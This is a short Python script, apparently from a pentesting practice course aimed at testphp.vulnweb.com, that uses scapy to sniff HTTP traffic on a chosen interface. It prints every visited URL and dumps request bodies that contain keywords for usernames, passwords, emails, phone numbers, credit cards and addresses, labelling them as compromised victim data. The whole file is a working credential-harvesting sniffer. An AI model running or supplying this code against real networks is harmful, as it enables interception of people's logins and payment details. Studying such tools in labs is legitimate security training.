# /usr/bin/env python3
"""
HTTP sniffer

Práctica con testphp.vulnweb.com

"""

import argparse
import signal
import scapy.all as scapy
from scapy.layers import http


def def_handler(sig, frame):

    print("\n\n[!] Saliendo del programa...\n")
    exit(1)


signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    """
    Obtiene los argumentos de la línea de comandos
    """

    parser = argparse.ArgumentParser(description="DNS sniffer")
    parser.add_argument(
        "-i", "--interface",
        required=True, dest="interface",
        help="Interfaz de red a utilizar"
    )
    args = parser.parse_args()

    return args


def process_sniffed_packet(packet):
    """
    Procesa el paquete sniffado
    """

    cred_keywords = [
        "username", "user", "uname", "urname", "user_name", "usern"
        "login", "password", "pass", 
        "mail", "email", "correo",
        "phone", "telephone", "tel", "cellphone", "cell", "cel", "movil",
        "credit", "card", "cc", "tarjeta", "credito", "debito", "debit", "ucc"
        "address", "direccion", "dir", "street", "calle", "avenue", "av",
        "location", "city", "country"]

    if packet.haslayer(http.HTTPRequest):

        url = "http://" + \
            packet[http.HTTPRequest].Host.decode() + \
            packet[http.HTTPRequest].Path.decode()
        
        print(f"[+] URL visitada: {url}")

        if packet.haslayer(scapy.Raw):

            try:

                response = packet[scapy.Raw].load.decode()

                for keyword in cred_keywords:

                    if keyword in response:

                        print(f"[+] Información comprometida: {response}")
                        break

            except:

                pass


def sniff(interface):
    """
    Sniffing de paquetes
    """

    print("\n[+] Interceptando paquetes de la máquina victima: \n")

    scapy.sniff(
        iface=interface, store=False,
        prn=process_sniffed_packet
    )


def main():
    """
    Función principal
    """

    arguments = get_arguments()

    sniff(arguments.interface)


if __name__ == "__main__":

    main()
